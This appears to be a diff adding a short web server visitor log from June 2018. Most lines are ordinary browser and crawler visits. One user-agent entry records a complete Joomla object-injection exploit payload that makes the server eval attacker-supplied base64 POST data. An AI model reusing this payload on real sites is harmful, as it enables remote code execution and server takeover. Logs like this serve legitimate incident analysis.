@@ -1,0 +1,9 @@
+IP: 185.234.217.28 TIME: Jun 11 4:17:40 2018 REFERRER:  SEARCHSTRING:  USERAGENT: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)
+IP: 185.234.217.28 TIME: Jun 11 4:17:40 2018 REFERRER:  SEARCHSTRING:  USERAGENT: }__test|O:21:"JDatabaseDriverMysqli":3:{s:4:"\0\0\0a";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:5:"cache";b:1;s:19:"cache_name_function";s:6:"assert";s:10:"javascript";i:9999;s:8:"feed_url";s:54:"eval(base64_decode($_POST[111]));JFactory::get();exit;";}i:1;s:4:"init";}}s:13:"\0\0\0connection";i:1;}𝌆
+IP: 185.234.217.28 TIME: Jun 11 4:17:41 2018 REFERRER:  SEARCHSTRING:  USERAGENT: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)
+IP: 141.8.142.131 TIME: Jun 11 7:08:47 2018 REFERRER:  SEARCHSTRING:  USERAGENT: Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)
+IP: 103.10.28.237 TIME: Jun 11 12:25:45 2018 REFERRER:  SEARCHSTRING:  USERAGENT: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36
+IP: 116.68.212.232 TIME: Jun 11 13:42:00 2018 REFERRER:  SEARCHSTRING:  USERAGENT: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.79 Safari/537.36
+IP: 116.68.212.232 TIME: Jun 11 13:42:56 2018 REFERRER:  SEARCHSTRING:  USERAGENT: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.79 Safari/537.36
+IP: 66.249.66.28 TIME: Jun 11 16:23:14 2018 REFERRER:  SEARCHSTRING:  USERAGENT: Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+IP: 66.249.66.6 TIME: Jun 11 16:59:22 2018 REFERRER:  SEARCHSTRING:  USERAGENT: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
